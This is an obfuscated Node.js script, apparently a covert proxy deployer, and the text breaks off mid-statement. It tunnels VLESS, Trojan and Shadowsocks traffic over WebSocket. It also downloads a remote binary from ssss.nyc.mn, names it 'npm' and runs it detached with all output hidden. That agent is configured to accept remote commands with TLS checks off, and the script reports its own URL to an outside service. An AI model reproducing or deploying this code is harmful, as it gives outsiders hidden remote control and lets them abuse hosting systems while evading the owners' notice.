#!/usr/bin/env node

const _0x4b2f90=_0x358a;(function(_0x19c1db,_0x3874ce){const _0x2247fb={_0x11a0c3:0x12e,_0x3debb7:0x108,_0x3be3c8:0xc9,_0x53be4b:0x141},_0x2211af=_0x358a,_0x56094f=_0x19c1db();while(!![]){try{const _0x2b5c29=parseInt(_0x2211af(0xdc))/0x1+-parseInt(_0x2211af(_0x2247fb._0x11a0c3))/0x2+-parseInt(_0x2211af(0x125))/0x3+parseInt(_0x2211af(_0x2247fb._0x3debb7))/0x4+parseInt(_0x2211af(_0x2247fb._0x3be3c8))/0x5*(-parseInt(_0x2211af(0xec))/0x6)+-parseInt(_0x2211af(0xf3))/0x7+-parseInt(_0x2211af(0x124))/0x8*(-parseInt(_0x2211af(_0x2247fb._0x53be4b))/0x9);if(_0x2b5c29===_0x3874ce)break;else _0x56094f['push'](_0x56094f['shift']());}catch(_0x5b11e8){_0x56094f['push'](_0x56094f['shift']());}}}(_0x3538,0x5748c));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x4b2f90(0xfb)),crypto=require(_0x4b2f90(0x116)),{Buffer}=require(_0x4b2f90(0xd7)),{exec,execSync}=require(_0x4b2f90(0xfc)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x4b2f90(0xe3)]||_0x4b2f90(0xd4),NEZHA_SERVER=process[_0x4b2f90(0xdd)][_0x4b2f90(0xe6)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x4b2f90(0xdd)]['NEZHA_KEY']||'',DOMAIN=process[_0x4b2f90(0xdd)][_0x4b2f90(0x137)]||'your-domain.com',AUTO_ACCESS=process['env'][_0x4b2f90(0x12b)]||![],WSPATH=process[_0x4b2f90(0xdd)][_0x4b2f90(0x10e)]||UUID[_0x4b2f90(0x133)](0x0,0x8),SUB_PATH=process[_0x4b2f90(0xdd)][_0x4b2f90(0x135)]||_0x4b2f90(0xe2),NAME=process[_0x4b2f90(0xdd)]['NAME']||'',PORT=process[_0x4b2f90(0xdd)]['PORT']||0xbb8;let uuid=UUID['replace'](/-/g,''),CurrentDomain=DOMAIN,Tls=_0x4b2f90(0x132),CurrentPort=0x1bb,ISP='';function _0x3538(){const _0xd13c9c=['crypto','connect','?encryption=none&security=','close','map','arm','every','\x20with\x20all\x20DNS\x20servers','1.1.1.1','speedtest.net','update','get','client_secret:\x20','some','40JQCIXT','1927443RhAxDB','log','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','then','https://arm64.ssss.nyc.mn/agent','pop','AUTO_ACCESS','https://api-ipv4.ip.sb/ip','speedof.me','418066jtmZRJ','text/html','utf-8','message','tls','slice','Server','SUB_PATH','readUInt8','DOMAIN','testmy.net','text/plain','ss://','includes','Failed\x20to\x20get\x20IP','&path=%2F','https://dns.google/resolve?name=','startsWith','length','2141487Fttyqx','connection','error:\x20','none','concat','pipe','error','substr','readFile','unlink','false','decode','bandwidth.place','createWriteStream','https://arm64.ssss.nyc.mn/v1','stream','&type=A','Answer','isp','38295frldyw','countryCode','write','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','org','Failed\x20to\x20resolve\x20','fast.com','--tls','data','npm\x20is\x20already\x20running,\x20skip\x20running...','npm\x20download\x20successfully','c8221f1a-b462-4897-8455-3314bddc4cd5','type','speedcheck.org','buffer','arch','toString','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://','40440vGMoOV','env','sha224','Status','Unknown','config.yaml','xiajunzhe','UUID','readUInt16BE','createHash','NEZHA_SERVER','443','reduce','post','\x20-p\x20','&fp=chrome&type=ws&host=','42JvmHlJ','npm','country_code',';path%3D%2F','http://ip-api.com/json','replace','npm\x20running\x20error:','1099245lLpwbl','send','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','end','writeHead','https://amd64.ssss.nyc.mn/v1','Not\x20Found\x0a','index.html','path','child_process','none:','Hello\x20world!','2087','https://api.ip.sb/geoip','https://amd64.ssss.nyc.mn/agent','Server\x20is\x20running\x20on\x20port\x20','&sni=','trim','url','find','Automatic\x20Access\x20Task\x20added\x20successfully','758092icriET','trojan://','utf8','2096','forEach','base64','WSPATH','toLowerCase','from',';skip-cert-verify%3Dtrue;mux%3D0#','createServer','join','tls;','listen'];_0x3538=function(){return _0xd13c9c;};return _0x3538();}function _0x358a(_0x15a58e,_0x336928){const _0x353838=_0x3538();return _0x358a=function(_0x358a4a,_0x503f9f){_0x358a4a=_0x358a4a-0xc2;let _0x377d67=_0x353838[_0x358a4a];return _0x377d67;},_0x358a(_0x15a58e,_0x336928);}const DNS_SERVERS=['8.8.4.4',_0x4b2f90(0x11e)],BLOCKED_DOMAINS=[_0x4b2f90(0x11f),_0x4b2f90(0xcf),'speedtest.cn','speed.cloudflare.com',_0x4b2f90(0x12d),_0x4b2f90(0x138),_0x4b2f90(0xc2),'speed.io','librespeed.org',_0x4b2f90(0xd6)];function isBlockedDomain(_0x457095){const _0x2bc521=_0x4b2f90;if(!_0x457095)return![];const _0x25a1fe=_0x457095[_0x2bc521(0x10f)]();return BLOCKED_DOMAINS[_0x2bc521(0x123)](_0x163015=>{return _0x25a1fe===_0x163015||_0x25a1fe['endsWith']('.'+_0x163015);});}async function getisp(){const _0x53fdb8={_0x1557aa:0x121,_0x168f5e:0xd1,_0xe2d7b2:0xca,_0x58d4b4:0xcd},_0x543083=_0x4b2f90;try{const _0x8803=await axios[_0x543083(_0x53fdb8._0x1557aa)](_0x543083(0x100),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}}),_0x3769a0=_0x8803['data'];ISP=(_0x3769a0[_0x543083(0xee)]+'-'+_0x3769a0[_0x543083(0xc8)])[_0x543083(0xf1)](/ /g,'_');}catch(_0x439d5e){try{const _0x3a0c54=await axios[_0x543083(0x121)](_0x543083(0xf0),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}}),_0x1afb47=_0x3a0c54[_0x543083(_0x53fdb8._0x168f5e)];ISP=(_0x1afb47[_0x543083(_0x53fdb8._0xe2d7b2)]+'-'+_0x1afb47[_0x543083(_0x53fdb8._0x58d4b4)])[_0x543083(0xf1)](/ /g,'_');}catch(_0x4037a6){ISP=_0x543083(0xe0);}}}async function getip(){const _0x4002d2={_0x331bea:0x12c,_0x303f46:0x13c,_0x1e8d64:0x131,_0x293916:0x132},_0x4d459d=_0x4b2f90;if(!DOMAIN||DOMAIN==='your-domain.com')try{const _0x594d69=await axios[_0x4d459d(0x121)](_0x4d459d(_0x4002d2._0x331bea),{'timeout':0x1388}),_0x28e64b=_0x594d69[_0x4d459d(0xd1)]['trim']();CurrentDomain=_0x28e64b,Tls=_0x4d459d(0x144),CurrentPort=PORT;}catch(_0x1b57ad){console['error'](_0x4d459d(_0x4002d2._0x303f46),_0x1b57ad[_0x4d459d(_0x4002d2._0x1e8d64)]),(CurrentDomain='cahnge-your-domain.com',Tls=_0x4d459d(0x132),CurrentPort=0x1bb);}else CurrentDomain=DOMAIN,Tls=_0x4d459d(_0x4002d2._0x293916),CurrentPort=0x1bb;}const httpServer=http[_0x4b2f90(0x112)](async(_0x36e636,_0x582e70)=>{const _0x458c2e={_0xf71040:0x113,_0x33ee45:0xfa,_0x2da546:0x149,_0x32f250:0x105,_0x4bf3c9:0x132,_0x27bcb7:0x144,_0x369743:0x114,_0x52a2c3:0x118,_0x370731:0x109,_0x4d6c56:0x103,_0x3d7fdd:0x10d,_0x2f5538:0x139},_0x98cf6b={_0x54d47c:0x12f,_0x373351:0xf7},_0x40ce31=_0x4b2f90;if(_0x36e636['url']==='/'){const _0x114b4c=path[_0x40ce31(_0x458c2e._0xf71040)](__dirname,_0x40ce31(_0x458c2e._0x33ee45));fs[_0x40ce31(_0x458c2e._0x2da546)](_0x114b4c,_0x40ce31(0x10a),(_0x318ca8,_0x135432)=>{const _0x464ee7=_0x40ce31;if(_0x318ca8){_0x582e70['writeHead'](0xc8,{'Content-Type':_0x464ee7(_0x98cf6b._0x54d47c)}),_0x582e70[_0x464ee7(0xf6)](_0x464ee7(0xfe));return;}_0x582e70[_0x464ee7(_0x98cf6b._0x373351)](0xc8,{'Content-Type':_0x464ee7(0x12f)}),_0x582e70[_0x464ee7(0xf6)](_0x135432);});return;}else{if(_0x36e636[_0x40ce31(_0x458c2e._0x32f250)]==='/'+SUB_PATH){await getisp(),await getip();const _0x111ddd=NAME?NAME+'-'+ISP:ISP,_0x31a35b=Tls===_0x40ce31(_0x458c2e._0x4bf3c9)?_0x40ce31(0x132):_0x40ce31(_0x458c2e._0x27bcb7),_0x49b4a6=Tls===_0x40ce31(0x132)?_0x40ce31(_0x458c2e._0x369743):'',_0x4284b6='vless://'+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x40ce31(_0x458c2e._0x52a2c3)+_0x31a35b+_0x40ce31(0x103)+CurrentDomain+_0x40ce31(0xeb)+CurrentDomain+_0x40ce31(0x13d)+WSPATH+'#'+_0x111ddd,_0x4b1400=_0x40ce31(_0x458c2e._0x370731)+UUID+'@'+CurrentDomain+':'+CurrentPort+'?security='+_0x31a35b+_0x40ce31(_0x458c2e._0x4d6c56)+CurrentDomain+_0x40ce31(0xeb)+CurrentDomain+_0x40ce31(0x13d)+WSPATH+'#'+_0x111ddd,_0x556595=Buffer['from'](_0x40ce31(0xfd)+UUID)['toString'](_0x40ce31(_0x458c2e._0x3d7fdd)),_0x30fa33=_0x40ce31(0x13a)+_0x556595+'@'+CurrentDomain+':'+CurrentPort+'?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D'+CurrentDomain+_0x40ce31(0xef)+WSPATH+';'+_0x49b4a6+'sni%3D'+CurrentDomain+_0x40ce31(0x111)+_0x111ddd,_0xfb6421=_0x4284b6+'\x0a'+_0x4b1400+'\x0a'+_0x30fa33,_0x408505=Buffer[_0x40ce31(0x110)](_0xfb6421)['toString'](_0x40ce31(_0x458c2e._0x3d7fdd));_0x582e70['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x582e70[_0x40ce31(0xf6)](_0x408505+'\x0a');}else _0x582e70['writeHead'](0x194,{'Content-Type':_0x40ce31(_0x458c2e._0x2f5538)}),_0x582e70['end'](_0x40ce31(0xf9));}});function resolveHost(_0x3787a4){const _0x19f616={_0x1e6cdb:0x13e,_0x214376:0x121,_0x503008:0x128};return new Promise((_0x23198b,_0x24ec87)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x3787a4)){_0x23198b(_0x3787a4);return;}let _0x16212f=0x0;function _0x401fc4(){const _0x7f7b72={_0x2e2b97:0xd1,_0x477785:0xdf,_0x28952f:0xc7,_0x5bef8:0xc7,_0x50f105:0xd1},_0x2b5074=_0x358a;if(_0x16212f>=DNS_SERVERS[_0x2b5074(0x140)]){_0x24ec87(new Error(_0x2b5074(0xce)+_0x3787a4+_0x2b5074(0x11d)));return;}const _0x316a8f=DNS_SERVERS[_0x16212f];_0x16212f++;const _0x522426=_0x2b5074(_0x19f616._0x1e6cdb)+encodeURIComponent(_0x3787a4)+_0x2b5074(0xc6);axios[_0x2b5074(_0x19f616._0x214376)](_0x522426,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x2b5074(_0x19f616._0x503008)](_0x561e72=>{const _0x36d159=_0x2b5074,_0x3620cf=_0x561e72[_0x36d159(_0x7f7b72._0x2e2b97)];if(_0x3620cf[_0x36d159(_0x7f7b72._0x477785)]===0x0&&_0x3620cf[_0x36d159(_0x7f7b72._0x28952f)]&&_0x3620cf[_0x36d159(_0x7f7b72._0x5bef8)][_0x36d159(0x140)]>0x0){const _0x5db6de=_0x3620cf[_0x36d159(0xc7)][_0x36d159(0x106)](_0x4cb1a7=>_0x4cb1a7[_0x36d159(0xd5)]===0x1);if(_0x5db6de){_0x23198b(_0x5db6de[_0x36d159(_0x7f7b72._0x50f105)]);return;}}_0x401fc4();})['catch'](_0xdc501e=>{_0x401fc4();});}_0x401fc4();});}function handleVlsConnection(_0x21059d,_0x2e49a4){const _0x40ddd7={_0x1c56d2:0x11c,_0x5de611:0x136,_0x5745ac:0x133,_0x1f8df1:0x133,_0x1dab84:0xe8,_0x45bc8f:0xf4},_0x36d912={_0x5ce355:0x117},_0x3af117={_0x3dc416:0x146,_0x5d9668:0x147,_0x34be72:0x146},_0x88e7b3=_0x4b2f90,[_0x21cdd0]=_0x2e49a4,_0x348177=_0x2e49a4[_0x88e7b3(0x133)](0x1,0x11);if(!_0x348177[_0x88e7b3(_0x40ddd7._0x1c56d2)]((_0x21c5d3,_0x5d157e)=>_0x21c5d3==parseInt(uuid[_0x88e7b3(0x148)](_0x5d157e*0x2,0x2),0x10)))return![];let _0x4fe9ad=_0x2e49a4[_0x88e7b3(0x133)](0x11,0x12)[_0x88e7b3(_0x40ddd7._0x5de611)]()+0x13;const _0x538644=_0x2e49a4['slice'](_0x4fe9ad,_0x4fe9ad+=0x2)['readUInt16BE'](0x0),_0x1086a6=_0x2e49a4[_0x88e7b3(0x133)](_0x4fe9ad,_0x4fe9ad+=0x1)[_0x88e7b3(0x136)](),_0x3f0a66=_0x1086a6==0x1?_0x2e49a4[_0x88e7b3(_0x40ddd7._0x5745ac)](_0x4fe9ad,_0x4fe9ad+=0x4)[_0x88e7b3(0x113)]('.'):_0x1086a6==0x2?new TextDecoder()[_0x88e7b3(0x14c)](_0x2e49a4[_0x88e7b3(_0x40ddd7._0x1f8df1)](_0x4fe9ad+0x1,_0x4fe9ad+=0x1+_0x2e49a4[_0x88e7b3(0x133)](_0x4fe9ad,_0x4fe9ad+0x1)['readUInt8']())):_0x1086a6==0x3?_0x2e49a4[_0x88e7b3(0x133)](_0x4fe9ad,_0x4fe9ad+=0x10)[_0x88e7b3(_0x40ddd7._0x1dab84)]((_0x4df675,_0x20fa6f,_0x3f51c4,_0x37c657)=>_0x3f51c4%0x2?_0x4df675[_0x88e7b3(0x145)](_0x37c657[_0x88e7b3(0x133)](_0x3f51c4-0x1,_0x3f51c4+0x1)):_0x4df675,[])[_0x88e7b3(0x11a)](_0x4bcde8=>_0x4bcde8[_0x88e7b3(0xe4)](0x0)[_0x88e7b3(0xd9)](0x10))['join'](':'):'';if(isBlockedDomain(_0x3f0a66))return _0x21059d[_0x88e7b3(0x119)](),![];_0x21059d[_0x88e7b3(_0x40ddd7._0x45bc8f)](new Uint8Array([_0x21cdd0,0x0]));const _0x271eb4=createWebSocketStream(_0x21059d);return resolveHost(_0x3f0a66)['then'](_0x24aa4f=>{const _0x474086=_0x88e7b3;net['connect']({'host':_0x24aa4f,'port':_0x538644},function(){const _0x372071=_0x358a;this[_0x372071(0xcb)](_0x2e49a4[_0x372071(0x133)](_0x4fe9ad)),_0x271eb4['on'](_0x372071(0x147),()=>{})[_0x372071(_0x3af117._0x3dc416)](this)['on'](_0x372071(_0x3af117._0x5d9668),()=>{})[_0x372071(_0x3af117._0x34be72)](_0x271eb4);})['on'](_0x474086(0x147),()=>{});})['catch'](_0x5d8b02=>{const _0x1bd8c2={_0xea7fd7:0xcb,_0xac3b31:0x147,_0x4302bf:0x146},_0x25775b=_0x88e7b3;net[_0x25775b(_0x36d912._0x5ce355)]({'host':_0x3f0a66,'port':_0x538644},function(){const _0x3a686d=_0x25775b;this[_0x3a686d(_0x1bd8c2._0xea7fd7)](_0x2e49a4['slice'](_0x4fe9ad)),_0x271eb4['on'](_0x3a686d(_0x1bd8c2._0xac3b31),()=>{})[_0x3a686d(0x146)](this)['on']('error',()=>{})[_0x3a686d(_0x1bd8c2._0x4302bf)](_0x271eb4);})['on'](_0x25775b(0x147),()=>{});}),!![];}function handleTrojConnection(_0x1ecdda,_0xe99d4f){const _0x10b3a1={_0x53e578:0x140,_0x37cddb:0xe5,_0x47e875:0x113,_0x25ec2f:0x133,_0x1af31b:0xe8,_0x2cceac:0x11a,_0x34e7b4:0x140,_0x1f7ead:0x119},_0x4d86fe={_0x20be31:0x117},_0x179cb6={_0xed0e02:0x140,_0x8e478a:0xcb,_0x3566ca:0x133},_0x33df47={_0x5dbb22:0x117},_0x41dd1d=_0x4b2f90;try{if(_0xe99d4f[_0x41dd1d(_0x10b3a1._0x53e578)]<0x3a)return![];const _0x8f460c=_0xe99d4f['slice'](0x0,0x38)[_0x41dd1d(0xd9)](),_0x1ca83c=[UUID];let _0x224483=null;for(const _0x4efeda of _0x1ca83c){const _0x491278=crypto[_0x41dd1d(_0x10b3a1._0x37cddb)](_0x41dd1d(0xde))[_0x41dd1d(0x120)](_0x4efeda)['digest']('hex');if(_0x491278===_0x8f460c){_0x224483=_0x4efeda;break;}}if(!_0x224483)return![];let _0x23077a=0x38;_0xe99d4f[_0x23077a]===0xd&&_0xe99d4f[_0x23077a+0x1]===0xa&&(_0x23077a+=0x2);const _0x1b15f4=_0xe99d4f[_0x23077a];if(_0x1b15f4!==0x1)return![];_0x23077a+=0x1;const _0x1b6150=_0xe99d4f[_0x23077a];_0x23077a+=0x1;let _0x5da824,_0x34c7b7;if(_0x1b6150===0x1)_0x5da824=_0xe99d4f[_0x41dd1d(0x133)](_0x23077a,_0x23077a+0x4)[_0x41dd1d(_0x10b3a1._0x47e875)]('.'),_0x23077a+=0x4;else{if(_0x1b6150===0x3){const _0x3eec75=_0xe99d4f[_0x23077a];_0x23077a+=0x1,_0x5da824=_0xe99d4f[_0x41dd1d(_0x10b3a1._0x25ec2f)](_0x23077a,_0x23077a+_0x3eec75)['toString'](),_0x23077a+=_0x3eec75;}else{if(_0x1b6150===0x4)_0x5da824=_0xe99d4f[_0x41dd1d(0x133)](_0x23077a,_0x23077a+0x10)[_0x41dd1d(_0x10b3a1._0x1af31b)]((_0x50e62b,_0x8f3992,_0x2b6fb0,_0x478cea)=>_0x2b6fb0%0x2?_0x50e62b[_0x41dd1d(0x145)](_0x478cea['slice'](_0x2b6fb0-0x1,_0x2b6fb0+0x1)):_0x50e62b,[])[_0x41dd1d(_0x10b3a1._0x2cceac)](_0x342fa5=>_0x342fa5[_0x41dd1d(0xe4)](0x0)[_0x41dd1d(0xd9)](0x10))['join'](':'),_0x23077a+=0x10;else return![];}}_0x34c7b7=_0xe99d4f[_0x41dd1d(0xe4)](_0x23077a),_0x23077a+=0x2;_0x23077a<_0xe99d4f[_0x41dd1d(_0x10b3a1._0x34e7b4)]&&_0xe99d4f[_0x23077a]===0xd&&_0xe99d4f[_0x23077a+0x1]===0xa&&(_0x23077a+=0x2);if(isBlockedDomain(_0x5da824))return _0x1ecdda[_0x41dd1d(_0x10b3a1._0x1f7ead)](),![];const _0x31489=createWebSocketStream(_0x1ecdda);return resolveHost(_0x5da824)[_0x41dd1d(0x128)](_0x396286=>{const _0x2d89eb={_0x23818b:0xcb,_0x447392:0x147,_0x5437a8:0x146},_0x3f685a=_0x41dd1d;net[_0x3f685a(_0x33df47._0x5dbb22)]({'host':_0x396286,'port':_0x34c7b7},function(){const _0x387730=_0x3f685a;_0x23077a<_0xe99d4f[_0x387730(0x140)]&&this[_0x387730(_0x2d89eb._0x23818b)](_0xe99d4f['slice'](_0x23077a)),_0x31489['on'](_0x387730(_0x2d89eb._0x447392),()=>{})[_0x387730(_0x2d89eb._0x5437a8)](this)['on']('error',()=>{})['pipe'](_0x31489);})['on']('error',()=>{});})['catch'](_0x3f7071=>{const _0x12a612=_0x41dd1d;net[_0x12a612(_0x4d86fe._0x20be31)]({'host':_0x5da824,'port':_0x34c7b7},function(){const _0xde9c39=_0x12a612;_0x23077a<_0xe99d4f[_0xde9c39(_0x179cb6._0xed0e02)]&&this[_0xde9c39(_0x179cb6._0x8e478a)](_0xe99d4f[_0xde9c39(_0x179cb6._0x3566ca)](_0x23077a)),_0x31489['on']('error',()=>{})[_0xde9c39(0x146)](this)['on']('error',()=>{})[_0xde9c39(0x146)](_0x31489);})['on'](_0x12a612(0x147),()=>{});}),!![];}catch(_0x361fff){return![];}}function handleSsConnection(_0x259052,_0x45a68f){const _0x266794={_0x3e900d:0x113,_0x4d5265:0xe8,_0x5283ad:0x11a},_0x3367d8={_0x5eb788:0x147},_0x130a32={_0x3ccbd0:0x117},_0x164274=_0x4b2f90;try{let _0xb48f8b=0x0;const _0x654f69=_0x45a68f[_0xb48f8b];_0xb48f8b+=0x1;let _0x27aac7,_0x3aec93;if(_0x654f69===0x1)_0x27aac7=_0x45a68f['slice'](_0xb48f8b,_0xb48f8b+0x4)[_0x164274(_0x266794._0x3e900d)]('.'),_0xb48f8b+=0x4;else{if(_0x654f69===0x3){const _0x2897a9=_0x45a68f[_0xb48f8b];_0xb48f8b+=0x1,_0x27aac7=_0x45a68f['slice'](_0xb48f8b,_0xb48f8b+_0x2897a9)['toString'](),_0xb48f8b+=_0x2897a9;}else{if(_0x654f69===0x4)_0x27aac7=_0x45a68f['slice'](_0xb48f8b,_0xb48f8b+0x10)[_0x164274(_0x266794._0x4d5265)]((_0xd98f1c,_0x5dbf47,_0x1fb9f5,_0x5d7220)=>_0x1fb9f5%0x2?_0xd98f1c['concat'](_0x5d7220[_0x164274(0x133)](_0x1fb9f5-0x1,_0x1fb9f5+0x1)):_0xd98f1c,[])[_0x164274(_0x266794._0x5283ad)](_0x258a7e=>_0x258a7e[_0x164274(0xe4)](0x0)[_0x164274(0xd9)](0x10))[_0x164274(_0x266794._0x3e900d)](':'),_0xb48f8b+=0x10;else return![];}}_0x3aec93=_0x45a68f[_0x164274(0xe4)](_0xb48f8b),_0xb48f8b+=0x2;if(isBlockedDomain(_0x27aac7))return _0x259052[_0x164274(0x119)](),![];const _0x4a036c=createWebSocketStream(_0x259052);return resolveHost(_0x27aac7)[_0x164274(0x128)](_0x16e259=>{const _0x22c2f6={_0x249b89:0x147,_0x720b48:0x146},_0x7bdf60=_0x164274;net[_0x7bdf60(_0x130a32._0x3ccbd0)]({'host':_0x16e259,'port':_0x3aec93},function(){const _0x40cff9=_0x7bdf60;_0xb48f8b<_0x45a68f[_0x40cff9(0x140)]&&this['write'](_0x45a68f[_0x40cff9(0x133)](_0xb48f8b)),_0x4a036c['on']('error',()=>{})[_0x40cff9(0x146)](this)['on'](_0x40cff9(_0x22c2f6._0x249b89),()=>{})[_0x40cff9(_0x22c2f6._0x720b48)](_0x4a036c);})['on'](_0x7bdf60(0x147),()=>{});})['catch'](_0x1b64d5=>{const _0x470589={_0xc24f51:0x146},_0x29aaa8=_0x164274;net['connect']({'host':_0x27aac7,'port':_0x3aec93},function(){const _0x3af710=_0x358a;_0xb48f8b<_0x45a68f[_0x3af710(0x140)]&&this['write'](_0x45a68f[_0x3af710(0x133)](_0xb48f8b)),_0x4a036c['on']('error',()=>{})[_0x3af710(_0x470589._0xc24f51)](this)['on']('error',()=>{})['pipe'](_0x4a036c);})['on'](_0x29aaa8(_0x3367d8._0x5eb788),()=>{});}),!![];}catch(_0x1abbb9){return![];}}const wss=new WebSocket[(_0x4b2f90(0x134))]({'server':httpServer});wss['on'](_0x4b2f90(0x142),(_0x262e2b,_0x1cd442)=>{const _0x4cabf3={_0x4a54fd:0x13f,_0x42702d:0x119,_0x435f01:0x131},_0x410686={_0x5814fa:0x119},_0x4f3080=_0x4b2f90,_0x35eea7=_0x1cd442['url']||'',_0xdc9d50='/'+WSPATH;if(!_0x35eea7[_0x4f3080(_0x4cabf3._0x4a54fd)](_0xdc9d50)){_0x262e2b[_0x4f3080(_0x4cabf3._0x42702d)]();return;}_0x262e2b['once'](_0x4f3080(_0x4cabf3._0x435f01),_0xbb5de8=>{const _0x59980e=_0x4f3080;if(_0xbb5de8[_0x59980e(0x140)]>0x11&&_0xbb5de8[0x0]===0x0){const _0x561f80=_0xbb5de8[_0x59980e(0x133)](0x1,0x11),_0x3ff8a0=_0x561f80[_0x59980e(0x11c)]((_0x14ac46,_0x2a713a)=>_0x14ac46==parseInt(uuid[_0x59980e(0x148)](_0x2a713a*0x2,0x2),0x10));if(_0x3ff8a0){!handleVlsConnection(_0x262e2b,_0xbb5de8)&&_0x262e2b[_0x59980e(_0x410686._0x5814fa)]();return;}}if(_0xbb5de8[_0x59980e(0x140)]>=0x3a){if(handleTrojConnection(_0x262e2b,_0xbb5de8))return;}if(_0xbb5de8['length']>0x0&&(_0xbb5de8[0x0]===0x1||_0xbb5de8[0x0]===0x3||_0xbb5de8[0x0]===0x4)){if(handleSsConnection(_0x262e2b,_0xbb5de8))return;}_0x262e2b[_0x59980e(0x119)]();})['on'](_0x4f3080(0x147),()=>{});});const getDownloadUrl=()=>{const _0x531679={_0x289eab:0xd8,_0x3b3224:0x11b,_0x4276c4:0x129,_0x290b80:0xf8},_0xd09be5=_0x4b2f90,_0x391c37=os[_0xd09be5(_0x531679._0x289eab)]();return _0x391c37===_0xd09be5(_0x531679._0x3b3224)||_0x391c37==='arm64'||_0x391c37==='aarch64'?!NEZHA_PORT?_0xd09be5(0xc4):_0xd09be5(_0x531679._0x4276c4):!NEZHA_PORT?_0xd09be5(_0x531679._0x290b80):_0xd09be5(0x101);},downloadFile=async()=>{const _0x1ca738={_0x444b17:0xc3,_0x206cde:0xd1},_0x28ae08=_0x4b2f90;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x58c876=getDownloadUrl(),_0x3496e9=await axios({'method':_0x28ae08(0x121),'url':_0x58c876,'responseType':_0x28ae08(0xc5)}),_0x1b3120=fs[_0x28ae08(_0x1ca738._0x444b17)]('npm');return _0x3496e9[_0x28ae08(_0x1ca738._0x206cde)]['pipe'](_0x1b3120),new Promise((_0x30c751,_0x56dbf3)=>{const _0x2c1324={_0x6bfd26:0xd3},_0xd175bb=_0x28ae08;_0x1b3120['on']('finish',()=>{const _0x3c5e72=_0x358a;console[_0x3c5e72(0x126)](_0x3c5e72(_0x2c1324._0x6bfd26)),exec('chmod\x20+x\x20npm',_0x42710b=>{if(_0x42710b)_0x56dbf3(_0x42710b);_0x30c751();});}),_0x1b3120['on'](_0xd175bb(0x147),_0x56dbf3);});}catch(_0x40d237){throw _0x40d237;}},runnz=async()=>{const _0x50ae65={_0xf03ca1:0x130,_0x1045a0:0x104,_0x44f17d:0xe7,_0x1b34fc:0xd0,_0x47719c:0x13b,_0x2ac8fe:0x143},_0x1035d0=_0x4b2f90;try{const _0x5c5904=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x1035d0(_0x50ae65._0xf03ca1)});if(_0x5c5904[_0x1035d0(_0x50ae65._0x1045a0)]()!==''){console['log'](_0x1035d0(0xd2));return;}}catch(_0xef48c5){}await downloadFile();let _0x32b6df='',_0x26be8b=[_0x1035d0(_0x50ae65._0x44f17d),'8443',_0x1035d0(0x10b),_0x1035d0(0xff),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1f161f=_0x26be8b[_0x1035d0(0x13b)](NEZHA_PORT)?_0x1035d0(_0x50ae65._0x1b34fc):'';_0x32b6df='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x1035d0(0xea)+NEZHA_KEY+'\x20'+_0x1f161f+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x104885=NEZHA_SERVER[_0x1035d0(0x13b)](':')?NEZHA_SERVER['split'](':')[_0x1035d0(0x12a)]():'',_0x41052b=_0x26be8b[_0x1035d0(_0x50ae65._0x47719c)](_0x104885)?'true':_0x1035d0(0x14b),_0x4d3a3d=_0x1035d0(0x122)+NEZHA_KEY+_0x1035d0(0xda)+NEZHA_SERVER+_0x1035d0(0xf5)+_0x41052b+_0x1035d0(0xcc)+UUID;fs['writeFileSync'](_0x1035d0(0xe1),_0x4d3a3d);}_0x32b6df=_0x1035d0(0x127);}else return;}try{exec(_0x32b6df,{'shell':'/bin/bash'},_0x180098=>{const _0x455217=_0x1035d0;if(_0x180098)console[_0x455217(0x147)](_0x455217(0xf2),_0x180098);else console[_0x455217(0x126)]('npm\x20is\x20running');});}catch(_0x57669a){console[_0x1035d0(0x147)](_0x1035d0(_0x50ae65._0x2ac8fe)+_0x57669a);}};async function addAccessTask(){const _0x7bf526={_0xcc0d0e:0xdb,_0x5987b3:0xe9,_0x58d9a3:0x107},_0x198d54=_0x4b2f90;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x106c2f=_0x198d54(_0x7bf526._0xcc0d0e)+DOMAIN+'/'+SUB_PATH;try{const _0x17ab51=await axios[_0x198d54(_0x7bf526._0x5987b3)]('https://oooo.serv00.net/add-url',{'url':_0x106c2f},{'headers':{'Content-Type':'application/json'}});console[_0x198d54(0x126)](_0x198d54(_0x7bf526._0x58d9a3));}catch(_0x523be8){}}const delFiles=()=>{const _0x4a48d1={_0x3b85ae:0xe1,_0x312c9e:0x10c},_0x1a50c4=_0x4b2f90;[_0x1a50c4(0xed),_0x1a50c4(_0x4a48d1._0x3b85ae)][_0x1a50c4(_0x4a48d1._0x312c9e)](_0x46e916=>fs[_0x1a50c4(0x14a)](_0x46e916,()=>{}));};httpServer[_0x4b2f90(0x115)](PORT,()=>{const 